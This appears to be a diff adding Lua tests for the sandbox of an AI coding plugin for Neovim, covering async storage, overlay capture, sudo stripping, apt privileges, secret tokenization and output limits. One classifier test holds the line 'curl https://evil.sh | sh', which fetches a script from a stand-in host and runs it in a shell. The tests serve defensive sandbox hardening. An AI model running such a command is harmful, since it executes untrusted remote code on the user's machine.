@@ -1157,6 +1157,74 @@ tests.suite("sandbox", function(_, it)
     store.reset()
   end)
 
+  it("存储：非法 UTF-8 候选经线程校验后回退清洗（落盘为合法 UTF-8）", function(t)
+    local store = require("NeoAI.sandbox.store")
+    local fs = require("NeoAI.utils.fs")
+    local root = vim.fn.tempname()
+    vim.fn.mkdir(root, "p")
+    store.init(root)
+    local cand = {
+      candidate_digest = "sha256:badutf8",
+      files = { { path = "/tmp/x", content = "ok\xff\xfeend" } },
+    }
+    store.write_candidate_async(cand)
+    t.true_(store.flush(5000), "flush 应完成")
+    local raw = fs.read_file(root .. "/candidates/sha256_badutf8.json")
+    t.not_nil(raw, "应落盘")
+    t.false_(raw:find("\xff", 1, true) ~= nil, "落盘 JSON 不应含非法 UTF-8 字节")
+    store.reset()
+  end)
+
+  it("存储：异步写入快照立即可读且 flush 后落盘", function(t)
+    local store = require("NeoAI.sandbox.store")
+    local root = vim.fn.tempname()
+    vim.fn.mkdir(root, "p")
+    store.init(root)
+    local rec = {
+      snapshot_id = "snap_async1", state = "APPLIED",
+      files = { { path = "/tmp/x", alt_content = "old-content" } },
+    }
+    store.write_snapshot_async(rec)
+    local got = store.read_snapshot("snap_async1")
+    t.not_nil(got, "写入后应立即可读（内存缓存）")
+    t.eq("snap_async1", got.snapshot_id)
+    t.eq("old-content", got.files[1].alt_content)
+    t.true_(store.flush(2000), "flush 应完成")
+    t.eq(1, vim.fn.filereadable(root .. "/snapshots/snap_async1.json"), "flush 后应落盘")
+    local listed = false
+    for _, s in ipairs(store.list_snapshots()) do
+      if s.snapshot_id == "snap_async1" then listed = true end
+    end
+    t.true_(listed, "落盘快照应可被列出")
+    store.reset()
+  end)
+
+  it("工作线程：batched 保持顺序且限制并发", function(t)
+    local work = require("NeoAI.utils.work")
+    if not work.available() then return end
+    local tasks = {}
+    for i = 1, 20 do tasks[i] = i end
+    local max_inflight, inflight = 0, 0
+    local done, results, err = false, nil, nil
+    work.batched(tasks, 3, function(v)
+      inflight = inflight + 1
+      if inflight > max_inflight then max_inflight = inflight end
+      return work.run(function(x) return tostring(x) end, v):then_(function(r)
+        inflight = inflight - 1
+        return r
+      end)
+    end):then_(function(res)
+      results = res; done = true
+    end, function(e)
+      err = e; done = true
+    end)
+    t.true_(vim.wait(10000, function() return done end), "应完成: " .. tostring(err and err.message or err))
+    t.eq(20, #(results or {}), "结果数应一致")
+    t.eq("1", results[1], "顺序应保持")
+    t.eq("20", results[20], "顺序应保持")
+    t.true_(max_inflight <= 3, "并发不应超过上限")
+  end)
+
   it("加固：只读白名单可配置且跳过不存在项", function(t)
     local runtime = require("NeoAI.sandbox.runtime")
     local fs = require("NeoAI.utils.fs")
@@ -1228,6 +1296,31 @@ tests.suite("sandbox", function(_, it)
     t.eq("/root/other/x", runtime.outside_workspace("/root/other/x", "/root/proj"), "cwd 外 home 路径应命中")
     t.nil_(runtime.outside_workspace("/root/proj/a.lua", "/root/proj"), "cwd 子树不命中")
     t.nil_(runtime.outside_workspace("/usr/bin/ls", "/root/proj"), "系统路径不命中")
+  end)
+
+  it("越界访问判定：遮蔽目录配置变更后前缀缓存失效", function(t)
+    local runtime = require("NeoAI.sandbox.runtime")
+    with_config({ tools = { sandbox = { mask_dirs = { "/etc" } } } }, function()
+      t.eq("/etc/x", runtime.outside_workspace("/etc/x", "/root/proj"), "自定义遮蔽目录应命中")
+      t.nil_(runtime.outside_workspace("/root/other/x", "/root/proj"), "未配置的 /root 不再命中")
+    end)
+    -- 恢复默认配置：缓存应按配置表引用失效，/root 重新命中
+    t.eq("/root/other/x", runtime.outside_workspace("/root/other/x", "/root/proj"),
+      "恢复默认后 /root 应重新命中")
+  end)
+
+  it("证据：异步写入可 flush 落盘（观测留痕非阻塞）", function(t)
+    local store = require("NeoAI.sandbox.store")
+    local evidence = require("NeoAI.sandbox.evidence")
+    local root = vim.fn.tempname()
+    vim.fn.mkdir(root, "p")
+    store.init(root)
+    local id = evidence.add_async("observation",
+      { kind = "outside_access", path = "/root/x" }, { tool = "run_command" })
+    t.not_nil(id, "应返回 evidence_id")
+    t.true_(store.flush(5000), "flush 应完成")
+    t.not_nil(store.read_evidence(id), "异步写入的证据应可读回")
+    store.reset()
   end)
 
   it("越界访问留痕：read_file 访问 cwd 外用户目录被记录（非阻塞）", function(t)
@@ -1410,6 +1503,76 @@ tests.suite("sandbox", function(_, it)
     end)
   end)
 
+  it("异步捕获：超大文件不纳入候选且不进入 base 哈希列表", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    local candidate = require("NeoAI.sandbox.candidate")
+    local control = require("NeoAI.sandbox.control")
+    local store = require("NeoAI.sandbox.store")
+    with_config({ tools = { sandbox = {
+      workspace_root = vim.fn.tempname() .. "/sb", max_file_bytes = 1024,
+    } } }, function()
+      sandbox.reset()
+      local dir = fs.canonical(vim.fn.tempname())
+      fs.ensure_dir(dir)
+      local base = vim.fn.tempname()
+      local upper, work = base .. "/upper", base .. "/work"
+      fs.ensure_dir(upper); fs.ensure_dir(work)
+      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
+      candidate.begin(a, store.root())
+      -- 命令在 overlay 中创建一个小文件和一个超过上限的大文件（base 也放一份大文件，
+      -- 验证它不会进入 base 哈希列表被读取/哈希）。
+      fs.write_file(dir .. "/big.bin", string.rep("y", 4096))
+      fs.write_file(upper .. "/small.txt", "hi\n")
+      local bf = io.open(upper .. "/big.bin", "wb"); bf:write(string.rep("x", 4096)); bf:close()
+      local done, err = false, nil
+      candidate.capture_overlay_async(a.attempt_id, dir, upper):then_(function() done = true end, function(e)
+        err = e; done = true
+      end)
+      t.true_(vim.wait(20000, function() return done end, 20), "捕获应完成: " .. tostring(err))
+      local mapping = candidate.mapping(a.attempt_id)
+      t.not_nil(mapping[dir .. "/small.txt"], "小文件应进入候选")
+      t.eq(nil, mapping[dir .. "/big.bin"], "超大文件不应进入候选（也不应被 base 哈希）")
+      candidate.cleanup(a.attempt_id)
+      vim.fn.delete(dir, "rf")
+      vim.fn.delete(base, "rf")
+    end)
+  end)
+
+  it("异步捕获：未变文件第二次捕获不重复处理（不进入 mapping）", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    local candidate = require("NeoAI.sandbox.candidate")
+    local control = require("NeoAI.sandbox.control")
+    local store = require("NeoAI.sandbox.store")
+    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
+      sandbox.reset()
+      local dir = fs.canonical(vim.fn.tempname())
+      fs.ensure_dir(dir)
+      local base = vim.fn.tempname()
+      local upper, work = base .. "/upper", base .. "/work"
+      fs.ensure_dir(upper); fs.ensure_dir(work)
+      local a1 = control.new_attempt("run_command", {}, {}, { effect = "process" })
+      candidate.begin(a1, store.root())
+      fs.write_file(upper .. "/f.txt", "cmd\n")
+      local d1 = false
+      candidate.capture_overlay_async(a1.attempt_id, dir, upper):then_(function() d1 = true end, function() d1 = true end)
+      t.true_(vim.wait(10000, function() return d1 end, 20), "第一次捕获应完成")
+      t.not_nil(candidate.mapping(a1.attempt_id)[dir .. "/f.txt"], "首次应捕获")
+      -- 第二次捕获（新 attempt）：overlay 未变，应整体跳过、不产生任何 mapping 条目。
+      local a2 = control.new_attempt("run_command", {}, {}, { effect = "process" })
+      candidate.begin(a2, store.root())
+      local d2 = false
+      candidate.capture_overlay_async(a2.attempt_id, dir, upper):then_(function() d2 = true end, function() d2 = true end)
+      t.true_(vim.wait(10000, function() return d2 end, 20), "第二次捕获应完成")
+      t.eq(nil, candidate.mapping(a2.attempt_id)[dir .. "/f.txt"], "未变文件第二次不应重复处理")
+      candidate.cleanup(a1.attempt_id)
+      candidate.cleanup(a2.attempt_id)
+      vim.fn.delete(dir, "rf")
+      vim.fn.delete(base, "rf")
+    end)
+  end)
+
   it("run_command：非零退出以结构化 error 返回（UI 显示失败）", function(t)
     local registry = require("NeoAI.tools.registry")
     local tool = registry.get("run_command")
@@ -1430,7 +1593,7 @@ tests.suite("sandbox", function(_, it)
     t.eq(nil, require("NeoAI.utils.json").decode_or_nil(ok_res), "成功应为普通文本")
   end)
 
-  it("沙箱内 sudo/doas 被剥离（已是 root）", function(t)
+  it("沙箱内 sudo/doas 被剥离（已是 root，含链式/多行/-u/-i 形式）", function(t)
     local runtime = require("NeoAI.sandbox.runtime")
     if runtime.backend() ~= "bwrap" then return end
     local sandbox = require("NeoAI.sandbox")
@@ -1438,12 +1601,25 @@ tests.suite("sandbox", function(_, it)
       tools = { approval = { mode = "async" }, sandbox = { mode = "dry_run", review = { enabled = true } } },
     }, function()
       sandbox.reset()
+      -- 覆盖：前导、链式、多行、-u/-i、env 包装、引号内空白保留。
+      local cmd = table.concat({
+        "sudo sh -c 'echo A_OK'",
+        "echo b && sudo true && echo B_OK",
+        "sudo -u nobody id -u >/dev/null 2>&1 && echo C_OK",
+        "sudo -i </dev/null >/dev/null 2>&1; echo D_OK",
+        "env FOO=1 sudo true && echo E_OK",
+        "echo \"x  y\" && sudo true",
+      }, "\n")
       local done, out = false, nil
-      require("NeoAI.tools").execute("run_command", { command = "sudo sh -c 'echo SUDO_STRIPPED_OK'", description = "t" }, {})
+      require("NeoAI.tools").execute("run_command", { command = cmd, description = "t", timeout_ms = 30000 }, {})
         :then_(function(r) out = tostring(r); done = true end, function(e) out = tostring(e); done = true end)
-      t.true_(vim.wait(12000, function() return done end), "命令应完成")
-      t.true_(out:find("SUDO_STRIPPED_OK", 1, true) ~= nil, "sudo 应被剥离并正常执行，实际: " .. tostring(out))
-      t.true_(out:find("sudo:", 1, true) == nil, "不应出现 sudo 报错")
+      t.true_(vim.wait(40000, function() return done end), "命令应完成")
+      for _, k in ipairs({ "A_OK", "B_OK", "C_OK", "D_OK", "E_OK" }) do
+        t.true_(out:find(k, 1, true) ~= nil, "应输出 " .. k .. "，实际: " .. tostring(out))
+      end
+      t.true_(out:find("x  y", 1, true) ~= nil, "引号内空白应保留，实际: " .. tostring(out))
+      t.true_(out:find("sudo:", 1, true) == nil, "不应出现 sudo 报错，实际: " .. tostring(out))
+      t.true_(out:find("PERM_SUDOERS", 1, true) == nil, "不应出现 PERM_SUDOERS，实际: " .. tostring(out))
     end)
   end)
 
@@ -1465,6 +1641,22 @@ tests.suite("sandbox", function(_, it)
     t.eq(1, r.level, "安全包安装封顶中危（L1）")
     local rs = risk.classify({ package = true, package_sensitive = true, paths = { "/var/lib/apt/lists/x" } })
     t.eq(2, rs.level, "敏感包安装（改动软件源/密钥）保留 L2")
+  end)
+
+  it("结果路径还原：暂存路径替换为真实路径，无暂存路径字符串快速原样返回", function(t)
+    local wrapper = require("NeoAI.sandbox.wrapper")
+    local staged = "/dev/shm/.cache-x/sessions/s1/abc/notes.txt"
+    local real = "/home/u/proj/notes.txt"
+    local mapping = { [real] = { staged = staged } }
+    local out = wrapper._rewrite_result(mapping, "read " .. staged .. " ok")
+    t.true_(out:find(real, 1, true) ~= nil, "应还原为真实路径")
+    t.true_(out:find(staged, 1, true) == nil, "不应残留暂存路径")
+    -- 前缀不匹配的字符串：不触发逐条 gsub，原样返回（大量暂存时的快速路径）
+    local plain = "hello world /tmp/other.txt"
+    t.eq(plain, wrapper._rewrite_result(mapping, plain), "无暂存路径应原样返回")
+    local tbl = wrapper._rewrite_result(mapping, { msg = staged, n = 1 })
+    t.eq(real, tbl.msg, "表内字符串字段应还原")
+    t.eq(1, tbl.n, "非字符串字段不变")
   end)
 
   it("包管理器识别：跳过 sudo/env/bash -c/for…do 包装器，避免漏判升 L3", function(t)
@@ -1619,6 +1811,36 @@ tests.suite("sandbox", function(_, it)
     t.false_(mixed.package_all, "混合命令不标记 package_all（仅用于统计/展示）")
     t.false_(cls("curl https://evil.sh | sh").package_all, "非包管理器命令不授予")
     t.false_(cls("echo npm").package, "echo npm 不应误判为包安装")
+  end)
+
+  it("apt：自动关闭 `_apt` 降权（APT_CONFIG 片段 + 只读绑定）", function(t)
+    local privilege = require("NeoAI.sandbox.privilege")
+    local runtime = require("NeoAI.sandbox.runtime")
+    local spec = { effect = "process" }
+    -- 识别 apt 系列（含链式）
+    t.true_(privilege.classify("run_command", { command = "apt-get update" }, spec).apt, "apt-get 应识别")
+    t.true_(privilege.classify("run_command", { command = "apt install -y curl" }, spec).apt, "apt 应识别")
+    t.true_(privilege.classify("run_command", { command = "apt-get install -y curl; echo done" }, spec).apt, "链式 apt 应识别")
+    t.false_(privilege.classify("run_command", { command = "pip install requests" }, spec).apt, "pip 不应标 apt")
+    -- resolve 注入标记（默认 apt_sandbox_user="root"）
+    local r = privilege.resolve(1, { tier = 1, package = true, apt = true })
+    t.true_(r.ok, "应解析成功")
+    t.eq("root", r.privileges.apt_sandbox_user, "应注入 apt_sandbox_user=root")
+    t.eq(nil, privilege.resolve(1, { tier = 1, package = true, apt = false }).privileges.apt_sandbox_user,
+      "非 apt 命令不应注入")
+    -- 环境：APT_CONFIG 指向沙箱内挂载点
+    t.eq("/tmp/.apt.conf", runtime.sandbox_env({ apt_sandbox_user = "root" }).APT_CONFIG, "应设置 APT_CONFIG")
+    t.eq(nil, runtime.sandbox_env({}).APT_CONFIG, "无标记时不设置 APT_CONFIG")
+    -- 前缀：包含到该挂载点的只读绑定
+    if runtime.backend() == "bwrap" then
+      local joined = table.concat(runtime.process_prefix({ cwd = "/tmp", privileges = r.privileges }) or {}, " ")
+      t.true_(joined:find("/tmp/.apt.conf", 1, true) ~= nil, "应绑定到 APT_CONFIG 路径")
+    end
+    -- 配置 "_apt" 时保留 apt 默认行为
+    with_config({ tools = { sandbox = { packages = { apt_sandbox_user = "_apt" } } } }, function()
+      t.eq(nil, privilege.resolve(1, { tier = 1, package = true, apt = true }).privileges.apt_sandbox_user,
+        "配置 _apt 时不注入")
+    end)
   end)
 
   it("权限档位：docker unmask 仅对 docker 命令生效", function(t)
@@ -2441,6 +2663,16 @@ tests.suite("sandbox", function(_, it)
       "/root/test/python-app/.venv/lib/python3.13/site-packages/pip/_vendor/certifi/cacert.pem",
       "/etc/ssl/certs/ca-certificates.pem",
       "/usr/lib/python3/dist-packages/certifi/cacert.pem",
+      -- 系统 CA 包（Debian/Ubuntu `/usr/lib/ssl/cert.pem`、`/etc/ssl/certs/ca-certificates.crt`）
+      "/usr/lib/ssl/cert.pem",
+      "/etc/ssl/certs/ca-certificates.crt",
+      "/etc/pki/tls/certs/ca-bundle.crt",
+      -- 第三方包缓存/vendored 源码树中的测试夹具（cargo check 等会大量打开）
+      "/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/openssl-0.10.81/test/key.pem",
+      "/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/openssl-0.10.81/test/intermediate-ca.key",
+      "/root/.cargo/registry/src/index.crates.io-1949cf8c6b5b557f/tokio-native-tls-0.3.1/tests/identity.p12",
+      "/proj/node_modules/foo/test/server.key",
+      "/root/.venv/lib/python3.13/site-packages/pkg/test/id_rsa",
     }) do
       t.false_(secret.is_sensitive_path(p), "不应视为凭据文件: " .. p)
     end
@@ -3344,6 +3576,42 @@ tests.suite("sandbox", function(_, it)
     vim.fn.delete(dir, "rf")
   end)
 
+  it("run_command：async 后处理——结果先返回，后台完成冻结/入队", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    local runtime = require("NeoAI.sandbox.runtime")
+    if runtime.backend() ~= "bwrap" then return end -- overlay 仅 bwrap 后端
+    local dir = vim.fn.tempname()
+    fs.ensure_dir(dir)
+    local prev = vim.fn.getcwd()
+    vim.fn.chdir(dir)
+    with_config({ tools = { approval = { mode = "auto_allow" },
+      sandbox = { mode = "dry_run", review = { enabled = true }, postprocess = "async" } } }, function()
+      sandbox.reset()
+      local done, result = false, nil
+      require("NeoAI.tools").execute("run_command",
+        { command = "echo hi > made.txt", description = "t" }, {})
+        :then_(function(r) result = r; done = true end, function(e) result = e; done = true end)
+      t.true_(vim.wait(15000, function() return done end), "run_command 应返回结果")
+      t.not_nil(result, "应先返回结果（不等后处理）")
+      -- 结果返回后立即读取命令创建的文件：read 工具应等待后台合并完成，看到一致视图。
+      local rd, rv = false, nil
+      require("NeoAI.tools").execute("read_file",
+        { filepath = dir .. "/made.txt", description = "r" }, {})
+        :then_(function(r) rv = tostring(r); rd = true end,
+          function(e) rv = "ERR:" .. tostring(e and e.message or e); rd = true end)
+      t.true_(vim.wait(60000, function() return rd end), "read_file 应完成")
+      t.matches("hi", rv or "", "read 应看到命令创建的文件内容")
+      -- 后台后处理（捕获/冻结/合并/入队）应最终完成
+      t.true_(sandbox.await_postprocess(30000), "后台后处理应完成")
+      local items = sandbox.list_reviews({ review_state = "PENDING" })
+      t.eq(1, #items, "后台应完成冻结并产生待审候选")
+      t.matches("made.txt", items[1].write_set[1] or "", "待审应含命令创建的文件")
+    end)
+    vim.fn.chdir(prev)
+    vim.fn.delete(dir, "rf")
+  end)
+
   it("run_command：只读命令不重复捕获已暂存编辑（不取代/回滚）", function(t)
     local fs = require("NeoAI.utils.fs")
     local sandbox = require("NeoAI.sandbox")
@@ -3504,8 +3772,8 @@ tests.suite("sandbox", function(_, it)
       candidate.materialize_overlay(specs)
       fs.write_file_atomic = orig
       t.eq(0, calls, "未改动文件重复物化不应重写")
-      -- 改动一个暂存文件后应只重写该文件
-      local staged = candidate.read_path(dir .. "/f1.txt")
+      -- 改动一个暂存文件后应只重写该文件（经 stage_path 模拟真实编辑：递增暂存版本）
+      local staged = candidate.stage_path(a.attempt_id, dir .. "/f1.txt")
       fs.write_file(staged, "staged 1 v2\n")
       local orig2 = fs.write_file_atomic
       local calls2 = 0
@@ -3516,6 +3784,262 @@ tests.suite("sandbox", function(_, it)
       candidate.cleanup(a.attempt_id)
     end)
     vim.fn.delete(dir, "rf")
+  end)
+
+  it("物化：未改动项重复物化不 fs_stat（按暂存版本跳过，避免暂存上万文件时主线程卡顿）", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    local candidate = require("NeoAI.sandbox.candidate")
+    local control = require("NeoAI.sandbox.control")
+    local store = require("NeoAI.sandbox.store")
+    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
+      sandbox.reset()
+      local dir = fs.canonical(vim.fn.tempname())
+      fs.ensure_dir(dir)
+      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
+      candidate.begin(a, store.root())
+      local files = {}
+      for i = 1, 20 do
+        local p = dir .. "/f" .. i .. ".txt"
+        fs.write_file(p, "base " .. i .. "\n")
+        files[#files + 1] = {
+          path = p, action = "modify", content = "staged " .. i .. "\n",
+          before_hash = "sha256:b" .. i, after_hash = "sha256:s" .. i, mode = 420,
+        }
+      end
+      candidate.merge_candidate({ files = files })
+      local base = vim.fn.tempname()
+      local upper, work = base .. "/upper", base .. "/work"
+      fs.ensure_dir(upper); fs.ensure_dir(work)
+      local specs = { { root = dir, upper = upper, work = work, mode = "overlay" } }
+      candidate.materialize_overlay(specs) -- 冷：写入全部
+      -- 热：版本全部未变，应完全跳过——不 stat/读/写任何暂存或目标文件。
+      local orig_stat = vim.uv.fs_stat
+      local stat_calls = 0
+      vim.uv.fs_stat = function(...) stat_calls = stat_calls + 1; return orig_stat(...) end
+      candidate.materialize_overlay(specs)
+      vim.uv.fs_stat = orig_stat
+      t.eq(0, stat_calls, "未改动项重复物化不应 fs_stat（按版本跳过）")
+      candidate.cleanup(a.attempt_id)
+      vim.fn.delete(dir, "rf")
+      vim.fn.delete(base, "rf")
+    end)
+  end)
+
+  it("物化：命令捕获来源（fresh）跳过冗余回写", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    local candidate = require("NeoAI.sandbox.candidate")
+    local control = require("NeoAI.sandbox.control")
+    local store = require("NeoAI.sandbox.store")
+    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
+      sandbox.reset()
+      local dir = fs.canonical(vim.fn.tempname())
+      fs.ensure_dir(dir)
+      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
+      candidate.begin(a, store.root())
+      local base = vim.fn.tempname()
+      local upper, work = base .. "/upper", base .. "/work"
+      fs.ensure_dir(upper); fs.ensure_dir(work)
+      -- 命令把内容写进 overlay dest，capture 冻结候选，merge 登记暂存并标记 fresh
+      fs.write_file(upper .. "/f.txt", "cmd content\n")
+      local cand = {
+        candidate_digest = "sha256:fresh1",
+        files = { {
+          path = dir .. "/f.txt", action = "create", content = "cmd content\n",
+          after_hash = "sha256:x", mode = 420,
+        } },
+      }
+      candidate.merge_candidate(cand, { from_command = true })
+      local specs = { { root = dir, upper = upper, work = work, mode = "overlay" } }
+      local orig = fs.write_file_atomic
+      local calls = 0
+      fs.write_file_atomic = function(...) calls = calls + 1; return orig(...) end
+      candidate.materialize_overlay(specs)
+      candidate.materialize_overlay(specs)
+      fs.write_file_atomic = orig
+      t.eq(0, calls, "fresh 条目不应被 detokenize 回写 overlay")
+      -- 暂存副本被编辑（经 stage_path，版本变化）后应恢复回写
+      local staged = candidate.stage_path(a.attempt_id, dir .. "/f.txt")
+      fs.write_file(staged, "edited\n")
+      local orig2 = fs.write_file_atomic
+      local calls2 = 0
+      fs.write_file_atomic = function(...) calls2 = calls2 + 1; return orig2(...) end
+      candidate.materialize_overlay(specs)
+      fs.write_file_atomic = orig2
+      t.eq(1, calls2, "暂存副本被编辑后应回写 overlay")
+      candidate.cleanup(a.attempt_id)
+    end)
+    vim.fn.delete(dir, "rf")
+  end)
+
+  it("包/生成内容：merge 跳过密钥 token 化", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    local candidate = require("NeoAI.sandbox.candidate")
+    local control = require("NeoAI.sandbox.control")
+    local store = require("NeoAI.sandbox.store")
+    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
+      sandbox.reset()
+      local dir = fs.canonical(vim.fn.tempname())
+      fs.ensure_dir(dir)
+      local secret_text = "AWS_ACCESS_KEY=AKIAIOSFODNN7EXAMPLE\n"
+      local a1 = control.new_attempt("run_command", {}, {}, { effect = "process" })
+      candidate.begin(a1, store.root())
+      candidate.merge_candidate({
+        files = { { path = dir .. "/a.txt", action = "create", content = secret_text, mode = 420 } },
+      })
+      t.matches("NEOKEY_", fs.read_file(candidate.read_path(dir .. "/a.txt")) or "",
+        "非包内容应 token 化")
+      candidate.cleanup(a1.attempt_id)
+      local a2 = control.new_attempt("run_command", {}, {}, { effect = "process" })
+      candidate.begin(a2, store.root())
+      candidate.merge_candidate({
+        files = { { path = dir .. "/b.txt", action = "create", content = secret_text, mode = 420 } },
+      }, { package = true })
+      t.eq(secret_text, fs.read_file(candidate.read_path(dir .. "/b.txt")) or "",
+        "包内容不应 token 化（与结算阶段跳过密钥检测一致）")
+      candidate.cleanup(a2.attempt_id)
+    end)
+    vim.fn.delete(dir, "rf")
+  end)
+
+  it("merge_candidate_async：写后回传签名使 fresh 跳过物化回写", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    local candidate = require("NeoAI.sandbox.candidate")
+    local control = require("NeoAI.sandbox.control")
+    local store = require("NeoAI.sandbox.store")
+    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
+      sandbox.reset()
+      local dir = fs.canonical(vim.fn.tempname())
+      fs.ensure_dir(dir)
+      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
+      candidate.begin(a, store.root())
+      local base = vim.fn.tempname()
+      local upper, work = base .. "/upper", base .. "/work"
+      fs.ensure_dir(upper); fs.ensure_dir(work)
+      local cand = {
+        candidate_digest = "sha256:asyncfresh",
+        files = { { path = dir .. "/f.txt", action = "create", content = "cmd content\n", mode = 420 } },
+      }
+      local ok, err = pcall(function()
+        t.await(candidate.merge_candidate_async(cand, { from_command = true }))
+      end)
+      if not ok then error(err, 0) end
+      -- 模拟 capture 已把命令内容写入 overlay dest：fresh 标记应使物化跳过回写。
+      fs.write_file(upper .. "/f.txt", "cmd content\n")
+      local specs = { { root = dir, upper = upper, work = work, mode = "overlay" } }
+      local orig = fs.write_file_atomic
+      local calls = 0
+      fs.write_file_atomic = function(...) calls = calls + 1; return orig(...) end
+      candidate.materialize_overlay(specs)
+      fs.write_file_atomic = orig
+      t.eq(0, calls, "fresh_ssig 正确时物化不应回写 overlay")
+      candidate.cleanup(a.attempt_id)
+      vim.fn.delete(base, "rf")
+    end)
+    vim.fn.delete(dir, "rf")
+  end)
+
+  it("merge_candidate_async：分块写入（work_chunk_files<文件数）内容完整且 fresh 签名可用", function(t)
+    local fs = require("NeoAI.utils.fs")
+    local sandbox = require("NeoAI.sandbox")
+    local candidate = require("NeoAI.sandbox.candidate")
+    local control = require("NeoAI.sandbox.control")
+    local store = require("NeoAI.sandbox.store")
+    local config_store = require("NeoAI.kernel.config_store")
+    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
+      sandbox.reset()
+      local saved_chunk = config_store.get("tools.sandbox.work_chunk_files")
+      local saved_par = config_store.get("tools.sandbox.work_parallelism")
+      -- 强制分块：文件数 > chunk 且 chunk 数 > 并发上限，覆盖跨块签名聚合与目录创建。
+      config_store.set("tools.sandbox.work_chunk_files", 2)
+      config_store.set("tools.sandbox.work_parallelism", 2)
+      local dir = fs.canonical(vim.fn.tempname())
+      fs.ensure_dir(dir)
+      local a = control.new_attempt("run_command", {}, {}, { effect = "process" })
+      candidate.begin(a, store.root())
+      local base = vim.fn.tempname()
+      local upper, work = base .. "/upper", base .. "/work"
+      fs.ensure_dir(upper); fs.ensure_dir(work)
+      local N = 7
+      local files = {}
+      for i = 1, N do
+        files[#files + 1] = {
+          path = dir .. "/d" .. i .. "/nested/f" .. i .. ".txt",
+          action = "create", content = "content " .. i .. "\n", mode = 420,
+        }
+      end
+      local cand = { candidate_digest = "sha256:chunkmerge", files = files }
+      local ok, err = pcall(function()
+        t.await(candidate.merge_candidate_async(cand, { from_command = true }))
+      end)
+      if not ok then error(err, 0) end
+      -- 跨块写入的每个文件都应落到暂存且内容完整（目录需已递归创建）。
+      for i = 1, N do
+        local staged = candidate.read_path(files[i].path)
+        t.not_nil(staged, "应可解析暂存路径: " .. files[i].path)
+        t.eq("content " .. i .. "\n", fs.read_file(staged) or "", "分块写入内容应完整")
+      end
+      -- 模拟命令已把相同内容写入 overlay：跨块回传的 fresh 签名应使物化跳过全部回写。
+      for i = 1, N do
+        local rel = files[i].path:sub(#dir + 2)
+        fs.ensure_dir(vim.fn.fnamemodify(upper .. "/" .. rel, ":h"))
+        fs.write_file(upper .. "/" .. rel, "content " .. i .. "\n")
+      end
+      local specs = { { root = dir, upper = upper, work = work, mode = "overlay" } }
+      local orig = fs.write_file_atomic
+      local calls = 0
+      fs.write_file_atomic = function(...) calls = calls + 1; return orig(...) end
+      candidate.materialize_overlay(specs)
+      fs.write_file_atomic = orig
+      t.eq(0, calls, "跨块回传的 fresh_ssig 应覆盖全部文件（物化不回写）")
+      candidate.cleanup(a.attempt_id)
+      config_store.set("tools.sandbox.work_chunk_files", saved_chunk or 128)
+      config_store.set("tools.sandbox.work_parallelism", saved_par or 4)
+      vim.fn.delete(base, "rf")
+    end)
+    vim.fn.delete(dir, "rf")
+  end)
+
+  it("待审项落盘剥离文件内容（避免重复编码大候选）", function(t)
+    local sandbox = require("NeoAI.sandbox")
+    local review = require("NeoAI.sandbox.review")
+    local store = require("NeoAI.sandbox.store")
+    with_config({ tools = { sandbox = { workspace_root = vim.fn.tempname() .. "/sb" } } }, function()
+      sandbox.reset()
+      local cand = {
+        candidate_digest = "sha256:persist1",
+        files = { { path = "/tmp/x.txt", action = "create", content = "hello world", mode = 420 } },
+      }
+      store.write_candidate(cand)
+      local item = review.enqueue(cand, { tool = "run_command" })
+      t.not_nil(item, "应入队")
+      t.eq("hello world", item.files[1].content, "内存项应保留内容")
+      local on_disk = store.read_review(item.change_set_id)
+      t.not_nil(on_disk, "应可读回")
+      t.nil_(on_disk.files[1].content, "落盘项不应含内容")
+    end)
+  end)
+
+  it("run_command：输出超上限时截断并终止（防大输出冻结）", function(t)
+    local tools = require("NeoAI.tools")
+    local config_store = require("NeoAI.kernel.config_store")
+    local saved = config_store.get("tools.run_command.max_output_bytes")
+    config_store.set("tools.run_command.max_output_bytes", 4096)
+    local ok, err = pcall(function()
+      local done, result = false, nil
+      tools.execute("run_command", { command = "seq 1 100000", description = "t" }, {}):then_(function(r)
+        done = true; result = r
+      end, function(e) done = true; err = e end)
+      t.true_(vim.wait(30000, function() return done end), "命令应完成")
+      t.true_(type(result) == "string", "应返回字符串结果")
+      t.matches("截断", result, "应标注输出截断")
+      t.true_(#result < 100000, "结果应被截断（不会包含全部 10 万行）")
+    end)
+    config_store.set("tools.run_command.max_output_bytes", saved)
+    if not ok then error(err, 0) end
   end)
 
   it("run_command：删除冻结为 delete 候选且不删真实文件", function(t)
